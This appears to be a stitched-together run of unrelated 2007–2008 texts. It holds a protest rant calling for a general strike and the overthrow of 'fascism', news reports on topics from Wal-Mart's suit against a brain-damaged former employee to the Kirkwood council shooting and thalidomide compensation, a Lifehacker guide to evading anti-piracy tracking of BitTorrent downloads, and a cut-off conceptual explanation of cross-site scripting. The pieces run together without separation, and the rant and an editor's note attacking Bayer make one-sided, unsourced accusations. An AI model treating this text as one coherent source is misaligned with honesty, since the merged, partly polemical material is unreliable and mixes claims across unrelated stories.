Why do any of us pay our Federal Taxes to a government that we abhor and which we adamantly disagree with ?
Why do we allow our hard earned money to be used for murder and oppression ?
Why is Congress giving BushCo more authority to begin a New World War ?
Where are religious leaders to lead us in pro-democracy demonstrations ?
Most of our mainstream religions suffer from the same neo -fascism that our governmental leaders suffer from .
Why do we march in DC on Saturdays and get arrested just to get arrested ?
It ’s time to descend on DC on a weekday and make commitments to our world and our posterity to overthrow this fascism right now ?
When can we have a country - wide massive general strike ?
Recent reports show that Saddam made overtures to America through the UAE and Spain to go into exile weeks before the March , 2003 invasion of Iraq .
Of course , the overtures were rejected because George ’s small mind was already made up to invade Iraq before he became president in some sick way to either show up or gain approval from a dysfunctional family .
What if Spain ’s former President Aznar had spoken up then ?
What if Colin Powell , George Tenet , or any of the criminal neocons had spoken up to prevent this horrible loss of life and pain before it even started ?
I would n’t be under a bench warrant right now .
Rev would n’t be recovering from a badly sprained ankle .
Casey would be alive and hundreds of thousands of others would be alive .
We ca n’t count on anyone but ourselves .
It ’s now up to we the people to follow the example of our brothers and sisters in Burma to courageously confront the anti-democracy / pro-fascist elements of our society .

Wall Street Journal :
The family of Deborah Shank has lost its last chance to stop Wal - Mart Stores from recouping hundreds of thousands of dollars in medical expenses from an accident settlement the Shanks hoped to use for her future care in a nursing home .
Last November , the WSJ reported in a front - page story how the retail giant had sued Deborah Shank — a 52 - year - old former Wal - Mart employee left permanently brain damaged from a car accident nearly eight years ago — for the money and won .
Like most employee health plans , Wal - Mart ’s gives it the right to recover medical expenses for accident - related care if a worker also collects damages in an injury suit .
After losing in federal court and again on appeal , the Shanks ’ last legal hope was a bid to the U.S. Supreme Court .
Yesterday , though , the court announced it would n’t take up the case , bringing the matter to a close .

WASHINGTON  Leading contributors to Senator Hillary Rodham Clinton intensified their effort to keep the Democratic presidential contest alive on Wednesday and urged Speaker Nancy Pelosi to stay out of the superdelegate fight , admonishing her for suggesting that the candidate ahead in pledged delegates  now Senator Barack Obama  should become the nominee .
“ This dynamic primary season is not at an end , ” said a letter to Ms. Pelosi , which was signed by 21 top Democratic fund - raisers .
“ Several states and millions of Democratic voters have not yet had a chance to cast their votes . ”
The letter , which carried threatening overtones in noting that many signatories were major Democratic donors , highlighted the deepening rift inside the party among supporters for Mrs. Clinton and Mr. Obama .
While Ms. Pelosi has declared her neutrality in the race , she has said that she believes that the party ’s superdelegates should not overrule the will of the voters and should back the candidate with the most pledged delegates .
As former President Bill Clinton warned voters in West Virginia to “ saddle up ” for a heated duel between the candidates , the Clinton supporters asked Ms. Pelosi to “ reflect in your comments a more open view to the optional independent actions of each of the delegates ” at the convention .
In a statement Wednesday evening , a spokesman for Ms. Pelosi said the speaker believed that the fight should be resolved before the convention .
ACCRA , Ghana -- Mohamed Aboutraika 's 77th minute goal enabled Egypt to retain the African Nations Cup with a 1 - 0 victory over Cameroon in the final in Accra on Sunday .
Aboutraika 's 77th minute matchwinner was his seventh goal of the tournament .
It was a record sixth title triumph for Egypt , who punished some uncertain defending by Rigobert Song to score the winner .
As Song dithered trying to clear , the persistent Mohamed Zidan gained possession and steered the ball across the goalmouth to Aboutraika , who slid his shot past Carlos Kameni .
Egypt , the first side to win back - to - back titles twice , were rarely troubled by Cameroon , the team they beat 4 - 2 in their opening group match in Ghana .
Matchwinner Aboutraika said : " Now we have to make sure that we keep this form going into the World Cup qualifiers .
" It 's one of the greatest days of my life .
It 's up there with winning the African Champions League . "
Egypt added the 2008 trophy to their wins in 1957 , 1959 , 1986 ( on penalties against Cameroon ) , 1998 and 2006 with coach Hassan Shehata joining an exclusive group of just two coaches who have won back - to - back titles .
Shehata had promised that his players could keep the trophy won in Cairo two years ago and his prediction was proved right on a hot and humid night in the Ghana capital .
Cameroon were without suspended defender Andre Bikey , but Alexandre Song , who had been carried off in the semifinal win over Ghana , was declared fit to start .
He lasted only a quarter of an hour before limping off dejectedly to make way for Benfica back Gilles Binya .
Before Song 's exit Hosny Abd Rabou had provided an early threat from Egypt with a 30 meter free kick which flew over the Cameroon defense to test Kameni .
The Cameroon keeper also kept out Emad Moteab 's angled shot but at the other end Egypt skipper Ahmed Hassan did well to deflect Joel Epaule 's shot to safety .
Pharoahs ' keeper Essam al - Hadary , man of the match against Ivory Coast , saved a 30 - meter free kick from Geremi and on the counter attack Kameni had to produce an acrobatic dive to keep out Moteab 's dangerous strike .
Eto'o , the competition 's all time top scorer , threatened with a lightning run down the left before Cameroon coach Otto Pfister brought on striker Mohamadou Idrissou for a midfielder , Achille Emana .
Shehata then introduced Hamburg striker Mohamed Zidan in a move that paid rich dividends .
Zidan , who scored twice in Egypt 's earlier win over Cameroon , harried Rigobert Song in the 77th minute and after winning a rough - and - tumble exchange for the ball , sent a controlled pass to the unmarked Aboutraika who had a simple task to score .
It was the Al Ahly midfielder 's fourth goal , and it set up a fraught final quarter of an hour as Cameroon frantically tried to get back into it but the defending champions held on to take the continental cup back to Cairo .
The victory sparked off scenes of elation in Egypt .
Girls wearing the Egyptian flag instead of the veil danced among tens of thousands in the streets of Cairo on Sunday night .
Crowds of people wearing the national flag colours of red , black and white erupted with screams of joy as the final whistle blew , some lighting handheld fireworks , others crying tears of relief .
" Finally something joyous happens to us , finally something happy happens to us , " said Mohammed Said , sporting an Egyptian flag instead of his traditional galabaya robe .
He had watched with many others on giant television screens on the central Midan Mustafa Mahmud square .
" With the government we have , everything is sad , the prices , the boats sink and trains crash , this is the only thing that gives us joy . "
Policemen forming part of the heavy security presence on the huge square danced and hugged their countrymen , crying the name of the final 's only goal - scorer , local Giza native " Mohamed Aboutraika -- Goal ! "
Supporters young and old carried aloft posters of Aboutrika alongside goalkeeper Essam al - Hadary , known locally as " The Wall . "
" It 's one of the rare occasions when there are no Muslims and Copts and we are only Egyptians , " said Coptic Christian Adel Zaki .
" We feel united and it is the only thing we celebrate together . "
All public transport was free as thousands headed towards the square .
Buses inched through the crowd , rooftops overflowing with people and flags .
" Aboutraika you are the master , " the crowd chanted , " You made the net sing your praises . "

ATHENS ( Reuters ) - As Greek scandals go , it started as a trivial but titillating tale -- a ministry official jumps from his balcony after being blackmailed by an angry lover .
A man reads front page headlines about the sex DVD scandal that has rocked Greece for weeks , in newspapers on display at a central Athens kiosk February 8 , 2008 .
Greeks have been mesmerised by the scandal , which broke when a ministry official attempted suicide after being blackmailed by an angry lover , and has damaged the conservative government 's popularity .

Many Greeks yawned .
Few suspected that what would soon be known as the “ sex , lies and DVDs scandal ” would effectively freeze planned reforms , push the conservative government closer to snap elections , and shake the foundations of Greek society .
“ This scandal has shown us what has been happening for years but none of us would publicly admit , ” said architecture student Victoria Deligianni , 24 , sitting at a central Athens cafe .
“ There is just no progress in this country . ”
Political analysts say the affair has turned the spotlight on all of Greece ’s ills -- nepotism , widespread corruption in politics and the press , sexism and lack of opportunity for qualified young people with no connections .
It was no secret Greece was in need of a cleanup in 2004 , when voters fed up with socialist scandals in the 1990s voted in the conservative New Democracy party .
Prime Minister Costas Karamanlis vowed to “ re-launch the state ” and end the chronic corruption that had long angered citizens and kept many foreign investors away .
He also promised to put in motion the reforms Greece needed to catch up with its European Union partners -- in education , social security , health and public services .
Instead , the public has been treated to a series of scandals .
In the past year alone , overpriced government bonds were sold to state pension funds and a labor minister was sacked over illegal Indian workers at his country house .
Greece ’s ranking on the Transparency International corruption watchdog ’s list has gone from bad to worse , falling to 56th in 2007 -- behind countries such as Jordan , Botswana and Costa Rica -- from 49th in 2004 .
SEX TALE
The DVD scandal has overshadowed the government ’s economic achievements , bringing its popularity to the lowest point since 2004 , under 30 percent , a recent poll showed .
According to the Greek press , it started when a young woman slept with her boss , who promised her a permanent ministry job .
When he did not deliver , she taped their private meetings in an attempt to blackmail him .
Then she went to Greek media with her DVD .
Most sent her away , but one journalist has been accused in the media of making a copy and delivering it to the prime minister ’s office .
When the DVD made it to Karamanlis ’s office , the official -- Culture Ministry general secretary Christos Zachopoulos , 54 -- resigned and then jumped .
He is now recovering in hospital .
A conservative MP was alleged to have acted as a go - between for the journalist and financial authorities .
After pressure , he resigned from his parliamentary group , cutting the government ’s number of seats to 151 in the 300 - seat house and raising the specter of snap elections .
NATION MESMERISED
Greek viewers have been mesmerized by the twists and turns in the saga that has dominated television news for weeks .
Newspapers on display at Athens ’ yellow kiosks publish daily revelations and the scandal dominates dinner conversation in tavernas across the country .
Greek blogs are rife with comments on the DVD ’s content , saying a sex scandal alone would hardly be reason for a Greek official to attempt suicide .
They say what may have pushed him over the edge was that he was caught making negative comments about the prime minister .
The government has insisted the issue was personal and any wrongdoing should be legally prosecuted .
“ We remain focused on the reforms we promised the Greek people , ” a senior government official told Reuters on condition of anonymity .
“ This issue will be resolved by Greek justice . ”
Opposition parties accuse Karamanlis of trying to obscure his own office ’s involvement , deflecting his political responsibilities and refusing to shed light on the case .
“ The government line has been disorientation , blackout , cover - up , lies , ” said socialist opposition PASOK party spokesman Yannis Ragoussis .
“ They set out to paint this as a personal issue and it has proven to be a deeply political case . ”
Zachopoulos , a former teacher who was hand - picked by Karamanlis , was close to the prime minister and his wife and held powers almost greater than the minister -- distributing large amounts of Greek and EU funds .
“ When I needed anything from the Culture Ministry , it was made clear to me that I should go to Zachopoulos , not the minister , ” a European ambassador to Athens told Reuters , also on condition of anonymity .
“ It was clear he was the man in charge . ”
Prosecutors are investigating Zachopoulos ’s financial records as well as ministry decisions to allow construction on or near historic sites .
So far , the only person to get into trouble over the scandal is the woman , 35 - year - old Evi Tsekou .
She has been charged with blackmail and is held pending trial .
Zachopoulos has not been charged over his sexual relationship with an employee .
“ The woman was the object of abuse of power and sexual harassment by a superior , even if she consented , according to Greek law , ” said Sissy Vovou , a member of the Athens Feminist Center .
“ It is unacceptable she is held in jail .
The only reason she is in is to keep her mouth shut . ”
For the many Greek women struggling to make it in a largely male - dominated society , she is an example of someone who took the easy way up and paid the price .
“ You study , you work hard and still you have to let someone grab your butt to rise , ” said Maria Saratsi , 38 , a former manager at a construction company .
TOKYO ( Reuters ) - Japanese Prime Minister Shinzo
Abe abruptly announced his resignation on Wednesday after a year in power dogged by scandals , an election rout and a crisis over Japan ’s support for U.S. - led operations in Afghanistan .
The hawkish Abe , who took office promising to boost Japan ’s global security profile , had seen his clout dwindle after a drubbing in upper house elections in July , but the announcement came as a bolt out of the blue .
“ I determined today that I should resign , ” a weary - looking Abe told a news conference .
Senior officials said health was a factor in the decision but Abe said he was going because a new prime minister would be better able to resolve a deadlock over extending a controversial mission to support U.S. military efforts in Afghanistan .
Abe , at 52 Japan ’s youngest prime minister since the end of World War Two , reshuffled his cabinet only last month to rekindle public approval , but a poll this week showed support was stuck below 30 percent .
“ There are many things I reflect on , ” the soft - spoken grandson of another prime minister said .
“ It is my responsibility that my old and new cabinet could not secure the public ’s trust . ”
Japanese stocks fell and the yen dipped briefly on concerns about political uncertainty .
Abe aides were not available to comment on speculation that an article was about to be published in a tabloid magazine on suspicions that Abe had evaded taxes , and that this had dictated the timing of his departure .
SUCCESSOR RACE
Abe will stay on in a caretaker role until a successor is chosen from his Liberal Democratic Party ( LDP ) in a party election that officials proposed be held on September 19 .
LDP Secretary - General Taro Aso , a close
Abe ally who shares most of his hawkish views on security policy , is seen as frontrunner to become the new prime minister .
Other names floated include former Finance Minister Sadakazu Tanigaki and former Chief Cabinet Secretary Yasuo Fukuda .
“ After the upper house election , I ’ve been saying a change of policy was needed , and we need to create an environment to do that , ” Tanigaki , a strong advocate of fiscal reform , told reporters .
“ I ’d like to discuss with my colleagues how we can do that , ” he added when asked about the party leadership contest .
The LDP and its junior partner have a huge majority in parliament ’s lower house , which picks the prime minister .
Abe had indicated that he would step down if he failed to extend a Japanese naval mission supporting U.S. - led operations in Afghanistan , but the timing of his move was unexpected .
“ It is the worst possible timing , ” LDP lawmaker Gen Nakatani told Fuji Television .

“ Parliament has started and it ’s now lost its leading act .
There will be confusion , loss and trouble . ”
Some local LDP chapters , worried that the party could not win the next general election with Abe in charge , had pushed him to step down .
No election need be held until 2009 , but a parliamentary deadlock could spark one sooner , pundits say .
Opposition parties , which won control of parliament ’s upper house in the July poll and can delay bills , including legislation to continue the navy ’s Afghan support mission in the Indian Ocean , had planned to grill Abe in parliament on Wednesday .
TIMING ‘ASTONISHING ’
Slideshow ( 3 images )
Both the LDP ’s coalition partner and Aso questioned the timing and said it was important to avoid a political vacuum .
Financial market players were also caught off guard .
“ The timing is astonishing .
It ’s a huge surprise .
He said he would risk his job in passing the anti-terrorism law , so I do n’t know why he is resigning before making the effort , ” said Koichi Haji , chief economist at NLI Research Institute .
Abe said he had decided to quit because opposition Democratic Party leader Ichiro Ozawa had declined to hold a one - on - one meeting about the Afghan support mission .
Ozawa denied he had rejected a meeting .
He said he was ready to meet Abe ’s successor but that his party ’s stance on the issue would not change .
Abe ’s support ratings have foundered amid government bungling and theft of public pension premiums and a series of scandals and gaffes that cost him five cabinet ministers , including one who committed suicide .
“ At first I had high hopes for him , but I was disappointed because ultimately he had no leadership , ” said Kumiko Eno , 60 , a Tokyo housewife .
Abe has put much of his energy into education reform and diplomacy , moving swiftly after taking office to improve relations with relations with China and South Korea .
“ Bilateral ties have achieved conspicuous improvement and development in recent years .
Prime Minister
Abe has played a positive and constructive role in it , ” Chinese foreign ministry spokeswoman Jiang
Yu said in a statement .
Some analysts said Abe ’s resignation might not affect economic policies much but would sour stock market sentiment .
Others noted his successor faced tough policy headaches including cutting Japan ’s huge public debt , tax reform and reviving weak regional economies .
WASHINGTON ( Reuters ) - Influenza viruses coat themselves in fatty material that hardens and protects them in colder temperatures -- a finding that could explain why winter is the flu season , U.S. researchers reported on Sunday .
Pedestrians make their way through the snow in New York , February 22 , 2008 .

This butter - like coating melts in the respiratory tract , allowing the virus to infect cells , the team at the National Institutes of Health found .
“ Like an M&M in your mouth , the protective covering melts when it enters the respiratory tract , ” said Joshua Zimmerberg of the National Institute of Child Health and Human Development ( NICHD ) , who led the study .
The NICHD is one of the National Institutes of Health .
“ It ’s only in this liquid phase that the virus is capable of entering a cell to infect it . ”
Experts have long pondered why flu and other respiratory viruses spread more in winter .
No one explanation , such as people staying indoors more , or the destructive effect of the sun ’s radiation in summer , has fully explained it .
The new report , published in the journal Nature Chemical Biology , could lead to new ways to prevent and treat flu , said NICHD Director Duane Alexander .
“ The study results open new avenues of research for thwarting winter flu outbreaks , ” Alexander said in a statement .
“ Now that we understand how the flu virus protects itself so that it can spread from person to person , we can work on ways to interfere with that protective mechanism . ”
Zimmerman ’s team used a type of imaging called nuclear magnetic resonance imaging to look at the outer coat of flu viruses .
GOING OUT INTO THE WORLD
Viruses cannot replicate on their own but instead must hijack a living cell .
Influenza viruses have a membrane - like outer coating that they fuse to the victim cell .
They inject genetic material into the cell , turning it into a virus factory .
Some types of viruses simply explode out of these hijacked cells , but influenza instead “ buds ” out , and uses lipids such as cholesterol from the cells to make a membrane to help it do so .
“ This is the protein we make vaccines against , ” Zimmerman said in a telephone interview .
The outside envelope protein , called hemagglutinin , gives influenza viruses the “ H ” in their names .
Inside a nice , warm cell , the hemagglutinin is liquid .
But at cooler temperatures it starts a process that resembles crystallization , called ordering .
“ It solidifies gradually all the way down from 40 degrees Celsius ( 104 degrees F ) down to 4 degrees C ( 39 degrees F ) , ” Zimmerman said .
“ I believe that this gradualness lets it exist at every temperature . ”
In warmer outdoor temperatures this protective coating melts , and unless it is inside a living person or animal , the virus perishes .
The finding could also help scientists find new ways to eradicate influenza .
In cold temperatures , the hard lipid shell might withstand certain detergents , making it more difficult to wash the virus off of hands and surfaces .
Influenza and other respiratory viruses are spread in small droplets broadcast by coughing , sneezing and talking and which can also settle onto surfaces , to be picked up on fingertips .
Editor ’s Note : Bayer bills itself as a “ global partner of UNEP , ” the United Nations Environment Program , determined to force us to “ Kick the CO2 or Carbon Habit , ” in other words force us to kick the civilization habit .
It should be noted that Bayer knowingly sold its AIDS infected “ Factor 8 ” blood product , resulting in the deaths of thousands of haemophiliacs worldwide ( see video below ) , so its supposed concern for the planet is , to say the least , disingenuous .

Click to viewEarlier this week , a Lifehacker reader caught downloading copyrighted material using BitTorrent told us about the scary warning letter she received from her ISP after a big media company filed a complaint .
Fact is , whether you 're downloading copyrighted material or not , no one likes to have their activities online monitored .
Let 's take a look at ways you can protect your downloading and file sharing privacy , and prevent the big media companies and other anti-P2P organizations from spying on your file sharing habits .
Advertisement
NOTE : It would be irresponsible to assure you that all of the methods highlighted below are foolproof .
However , each method can do a lot to increase your privacy and security when you 're downloading .

How You Get Caught Sharing Files with BitTorrent
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
When you download a file using BitTorrent , you 're connecting to several peers who are distributing chunks of the file you 're downloading .
In order to send data back and forth , you and your peers exchange IP addresses .
( IP addresses are like mailing addresses for sending data over the vastness of the internet . )
When you 're downloading copyrighted material , sometimes disingenuous organizations will join in the download and log your information , like your home IP address .
Once they have your address , they can find out who your ISP is and contact them to complain about copyright - infringing activity .
There are a few methods you can employ to protect yourself from this sort of tracking when you 're sharing files with BitTorrent , thus setting up a layer of protection between you and those who might track you and report you .
Below I 'll cover a couple : PeerGuardian2 and proxies — particularly a new proxy service called BTGuard .

Keep Anti-P2P Trackers Away from Your BitTorrent Downloads with PeerGuardian2
IP - blocking application PeerGuardian2 ( PG2 ) uses a constantly updated blacklist of IP addresses known to track your activity .
I mentioned PG2 in my intermediate guide to BitTorrent , but it bears refreshing .
Here 's how it works :
Advertisement
The first time you run PeerGuardian2 after you install it , you 'll have to go through a setup wizard to tell PeerGuardian what kind of blacklists to download and block .
By default , PG2 already has Anti-P2P organizations checked .
For our purposes , that 's really all you need , but PG2 is capable of blocking more IPs if you have other privacy concerns beyond P2P that you want to address .
Advertisement
On the next window of the PG2 setup wizard , you need to set your automatic update preferences .
Since your privacy is only as good as your blacklists , you want to ensure that you 've always got the latest and greatest lists available , so I 'd recommend choosing to check automatic updates every day .
Advertisement
Now you 're done setting up PG2 .
On the last window of the setup wizard , you 'll notice a disclaimer similar to the disclaimer I made above .
Remember , PG2 is not and cannot be 100 % effective , but it will provide a good deal more protection than downloading without .
Advertisement
When you click finish on the wizard , PG2 will run its first check for updates , downloading the blacklist for Anti-P2P organizations .
With PG2 running , you 'll never connect to the IP addresses on the Anti-P2P blacklist , meaning that those organization can't log your IP and your participation in a copyrighted download .
Obscure Yourself from Anti-P2P Trackers with a Proxy
When it comes to privacy on the internet , no solution is better than a good proxy — whether we 're talking about no -hassle proxy solutions like previously mentioned Vidalia ( which makes setting up a proxy through the Tor project a breeze ) or techier solutions , like rolling your own SSH proxy .
Advertisement

If we 're talking about file sharing , a proxy protects you by routing all of your traffic through another server when it leaves your computer and before it comes back to you .
That means that when you 're downloading data using a peer - to - peer protocol like BitTorrent , your peers can only see the proxy IP address , not your home IP address — so even if they are tracking your activity , they 're not actually tracking your address at all .
There are a number of proxy servers out there , including the well known The Onion Router network ( Tor ) .
The catch is , Tor is a proxy project that 's already choked for servers and speed , and using Tor to download via BitTorrent is considered poor form .
However , there are other proxy servers out there , including one made specifically for BitTorrent routing called BTGuard .
Advertisement
Located in Canada , BTGuard is a subscription service ( about $ 7 / month ) that promises anonymous BitTorrent connections , unlimited speeds , and that it can bypass your ISP 's bandwidth throttling ( if your ISP throttles BitTorrent ) .
The main catch when sending your BitTorrent traffic through proxies is that you 'll most likely see a speed drop , and sometimes it 's a very significant drop .
According to the TorrentFreak weblog , though , BitTorrent transfers with BTGuard are almost equal to a direct connection — meaning you get all the protection of a proxy without any of the nasty slowdown .
Advertisement
To set up a proxy in the popular BitTorrent client , uTorrent , just go to the uTorrent preferences , click on Connection in the sidebar , and then find the Proxy Server section .
From there , choose your proxy server type ( Socks4/ 5 , HTTP or HTTPS ) , enter in the address and port of your proxy server , and include any login information if your proxy uses it .
( If you 're using BTGuard , for example , you 'll be given a username and password when you sign up . )

Anecdotes of folks who 've been caught downloading copyrighted material are always a little scary .
Despite the legal issues involved , do n't forget that BitTorrent is only a protocol , and you choose how to use it .
BitTorrent is n't synonymous with copyright infringement — there are plenty of legal uses and legal downloads going on with BitTorrent applications every day .

Whether or not you 're using your BitTorrent client to download copyrighted materials , no one likes being spied on .
If you 're really serious about protecting your privacy , a proxy solution is probably the best .
There are several drawbacks to proxies , most notably speed issues , but also difficulty in finding reliable free proxies or the cost of a service like BTGuard .
PeerGuardian2 is freeware , easy to use , and will never slow down your downloads .
However , it 's much more susceptible to holes than proxies , since an IP - blocker is only as good as its blacklist , and those lists have to change and update regularly to keep up with the Anti-P2P addresses .

KIRKWOOD , Missouri ( Reuters ) - A gunman killed two police officers and three city officials on Thursday night when he stormed into a city council meeting in a suburb of St. Louis , police said .
The gunman , who was later shot dead by police , was identified by witnesses as 52 - year - old Charles “ Cookie ” Thornton , a contractor in a feud with local officials .
Police declined to confirm his identity .
He killed one police officer in the parking lot outside the city hall building in Kirkwood , Missouri , before rushing in as the meeting was getting under way .
“ He kept saying something about , ‘ Shoot the mayor ’ and he just walked around shooting anybody he could , ” said Janet McNichols , a reporter covering the meeting for the St. Louis Post - Dispatch newspaper .
Police said he shot dead a second police officer , and two council members and a city engineer .
A city attorney fended off the gunman by throwing chairs at him , according to witnesses at the meeting that was attended by roughly 30 people .
Kirkwood Mayor Mike Swoboda was shot in the head and was in critical condition and another reporter suffered a hand wound .

Thornton was well - known for his erratic behavior in Kirkwood , an upscale suburb of 25,000 people about 15 miles southwest of St. Louis .
He was convicted in 2006 of disorderly conduct after twice disrupting city council meetings .
Thornton had complained that his contracting business was being harassed by city officials and at one meeting he repeatedly called Mayor Swoboda a “ jackass ” before being hauled away .
Swoboda , the mayor since 2000 and a council member dating to 1976 , was due to leave office within months .
After the shooting , local television station KMOV - TV interviewed Gerald Thornton , the gunman ’s brother .
“ My brother went to war tonight with the people and government that were putting torment and strife into his life and he ended it , ” Gerald Thornton said .
“ I ’m OK with it . ”
A lawsuit by Thornton charging that his constitutional rights of free speech were violated at the meetings was dismissed last month by a federal judge .
Mass shootings are not particularly rare in the United States .
In December , a 19 - year - old gunman in Omaha , Nebraska , killed eight people and then himself at a shopping mall , and on Saturday a man robbing a clothing store outside Chicago shot five women to death .
He has not yet been caught .
On eve of debate , Gennifer Flowers says she 'll auction tapes of President Clinton RAW STORY
Published : Tuesday February 26 , 2008

Print This Email This As if Sen. Hillary Clinton ( D - NY ) did n't have enough to worry about .
Gennifer Flowers , who accused then - presidential candidate Bill Clinton of having a twelve - year relationship with her in 1992 , announced Monday she is auctioning tapes of conversations she had with the former president .
 I dont need to hurt Hillary , " a jilted Flowers announced in the Las Vegas Review Journal Tuesday .
" She is doing a fine job of that herself , along with her idiot husband .
Karma is an interesting thing .
If these two dont get elected , and they are a team , it will be karma coming back to visit them .
It 's about time . "
Clinton admitted having sexual relations with Flowers , once , in his autobiography , My Life .
Major media panned Flowers ' timing , and the tapes ' suspected content .
Bemoans the Los Angeles Times : " One can only imagine what else is on those tapes about shopping lists , the stock market and the dry cleaners .
Those preserved phone conversations all came before Monica and what 's - her - name and the other one with the big hair . "
Flowers does n't deny she 's looking for money .
She told the Journal she 's " kept the tapes 'very safe all these years , and when I just recently received more interest , I said , ' Why not ? ' "
Writing about the announcement , the Times ' Andrew Malcolm opined that the market for such recordings may be ebbing , and questions why Flowers picked Monday , of all days , to float the announcement .
" Somehow she says she detected renewed interest in the recordings recently and , thinking of her financial security , figured why not sell now ? "
Malcolm wrote .
" Why not indeed ?
If Mrs. Clinton does n't do very well in some states next week , the couple may not be around in the political news much anymore .
And there goes the market for secretly - made telephone tapes . "
" I certainly would enjoy the money for my future security , " Flowers remarked .
" I do n't have any guarantee what might be coming . "
Her publicist , Bruce Merrin , said she 's ' exploring a new book with " explosive story additions to the Clinton affair . ' "

Population growth and economic progress are part of the problem .
Consumption of meat and other high - quality foods mainly in China and India has boosted demand for grain for animal feed .
Poor harvests due to bad weather in this country and elsewhere have contributed .
High energy prices are adding to the pressures .
Yet the most important reason for the price shock is the rich world ’s subsidized appetite for biofuels .
In the United States , 14 percent of the corn crop was used to produce ethanol in 2006  a share expected to reach 30 percent by 2010 .
This is also cutting into production of staples like soybeans , as farmers take advantage of generous subsidies and switch crops to corn for fuel .
The benefits of this strategy are dubious .
A study by the Organization for Economic Cooperation and Development suggested that  absent new technologies  the United States , Canada and the European Union would require between 30 percent and 70 percent of their current crop area if they were to replace 10 percent of their transport fuel consumption with biofuels .
And two recent studies suggested that a large - scale effort across the world to grow crops for biofuels would add carbon dioxide to the atmosphere rather than reduce it .
The human costs of this diversion of food into energy are all too evident .
As a first step , the United States and other wealthy countries that are driving this problem must ensure that the United Nations and other relief agencies get the support they need to feed the most vulnerable people .
But aid is not a solution .
Congress must take a hard look at the effect of corn ethanol on food supplies in the same way the new energy bill requires it to review the environmental effects .
It must move toward ending subsidies that will become even more difficult to justify as oil prices rise and the costs of producing corn ethanol decline .
And it must press other wealthy countries to do the same before hunger turns to mass starvation .

Thalidomide has shown promise in some cancer treatments
It is 50 years since thalidomide was first introduced on to the UK market as a cure for morning sickness .
Those affected by the drug are still fighting for compensation - while others are fighting to access the drug .
Some 10,000 babies were born with deformities after their mothers took the drug - sometimes just once - while pregnant .
The majority were born in Germany , where the pill was invented .
Apparently a wonder drug , it was initially seen as a good news story in a country rebuilding itself after the devastation of war .
But the high was short - lived .
By 1961 , it had been withdrawn from sale after evidence of severe side - effects .
The company involved , Grunenthal , paid just over 100 m deutschmarks - the equivalent of about £ 100 m in today 's money - into a compensation fund for those affected .
You try decades of using short limbs to get about , to open cupboards - it takes its toll .
Many of us have managed to lead independent lives - but we want to be able to continue doing so
Guy Tweedy
Thalidomide campaigner
Nothing has gone in since : for many decades the firm argued that it had paid more than its dues and was , back then , operating in a completely different scientific and regulatory climate .
It is however currently in talks to make a new , " voluntary " payment to survivors - mainly the German ones who were exposed to the drug supplied directly by the company .
It says it has no responsibility for those whose mothers bought the pill from other firms who at the time held the licence .
But an international coalition of thalidomide victims , including some of the UK 's 457 survivors , says this is not good enough .
They want one million euros ( around £ 750,000 ) each from Grunenthal and the German government , to be paid out over 10 years .
At no time did Grunenthal market or sell thalidomide in Great Britain ... Grunenthal acknowledges no basis for such demands
Grunenthal statement on claims " It 's what we need to guarantee our future , " says UK campaigner Guy Tweedy .
" No - one expected us to live this long .
But we 've done just that , and our bodies have paid the price - we 're in pieces .
" You try decades of using short limbs to get about , to open cupboards - it takes its toll .
Many of us have managed to lead independent lives - but we want to be able to continue doing so . "
More please
The UK victims have in fact been separately compensated by the company which held the UK licence for the distribution of the drug , following a major campaign , and receive on average around £ 18,000 each year .
THALIDOMIDE TIMELINE
1953 - Drug created in Germany 1957 - Marketed to the public as a ' wonder drug ' for insomnia , colds , coughs and headaches 1958 - Licensed in the UK 1961 - William McBride , an Australian doctor , wrote to the Lancet after noticing a sudden increase in the number of deformed babies born at his hospital - all to mothers who had taken thalidomide .
The drug was withdrawn from use in November that year .
1968 - First UK compensation settlements reached with manufacturers Distillers Biochemicals Limited 1998 - Approved by the US 's Food and Drug Administration as a treatment for a complication of leprosy 2004 - Thalidomide available on a named patient basis and as part of clinical trials in the UK
But this is barely enough , they say , to buy a new wheelchair when the need arises .
Nonetheless , they freely admit they are in a better situation than many of their contemporaries .
While there is a similar compensation agreement in place in Sweden , where again a different company was involved in distribution , in Italy , Spain and Austria , there is nothing at all .
The numbers of victims are not known , and in fact it is only recently that the Spanish government even acknowledged that the drug was used there between 1959 and 1961
There are payments in Germany , where 2,872 survivors - the majority - live , but they are significantly less than those for their British counterparts .
People receive a maximum of 545 euros a month , from a fund created by Grunenthal and since topped up by the German government .
Moves are afoot to increase this amount - perhaps double it - and Grunenthal says it too would make a further contribution , although it stresses this would be a gesture on its part , rather than an obligation .
Taking care
And while this generation of thalidomide children fight for more help , a new one has been born .
Deported Ghanaian Ama Sumani needed thalidomide to prolong her life
At least three children have been born in Brazil in the past three years after their mothers took the drug while pregnant .
There have also been reports of thalidomide defects from Mexico , India , and Africa .
Because while the drug was taken off the market in the early 1960s as a cure for nausea , it was not long before researchers found it was remarkably effective in treating other conditions .
By the mid-1960s , an Israeli doctor was using it for ENL , a complication of leprosy .
Grunenthal had by the start of the new century provided nearly 4 m tablets - for free - around the world for ENL , although the World Health Organisation has subsequently advised against its use for this because of the risks .
But dozens of other conditions have also appeared to respond well to thalidomide where others have failed - from HIV / Aids to ulcers .
It is now increasingly used as a treatment for multiple myeloma , a cancer of the bone marrow .
But it is supposed to be used only under strict supervision .
Women taking it are advised to use a monthly contraception injection , or two forms of barrier contraceptives , while men are recommended to use a condom - as thalidomide is present in semen .
That children are being born with defects is testament to the fact that such safeguards are never universally applied .
But it is perhaps ironic that the drug which was once so freely - too freely - available is still not accessible to those who could well benefit from it .
Last month , a woman who was controversially deported back to Ghana from the UK while in the middle of cancer treatment , died .
The drug she needed to prolong her life was not available .
It was thalidomide .

IBM Rational AppScan : Cross - site scripting explained
What happens in a cross -site scripting attack
Cross - site scripting ( XSS for short ) is one of the most common application - level attacks that hackers use to sneak into Web applications .
XSS is an attack on the privacy of clients of a particular Web site , which can lead to a total breach of security when customer details are stolen or manipulated .
Most attacks involve two parties : either the attacker and the Web site or the attacker and the client victim .
Unlike those , the XSS attack involves three parties : the attacker , the client , and the Web site .
The goal of the XSS attack is to steal the client cookies or any other sensitive information that can identify the client with the Web site .
With the token of the legitimate user in hand , the attacker can proceed to act as the user in interaction with the site , thus to impersonate the user .
For example , in one audit conducted for a large company , it was possible to peek at the user 's credit card number and private information by using an XSS attack .
This was achieved by running malicious JavaScript code on the victim ( client ) browser , with the access privileges of the Web site .
These are the very limited JavaScript privileges that generally do not let the script access anything but site - related information .
It is important to stress that , although the vulnerability exists at the Web site , at no time is the Web site directly harmed .
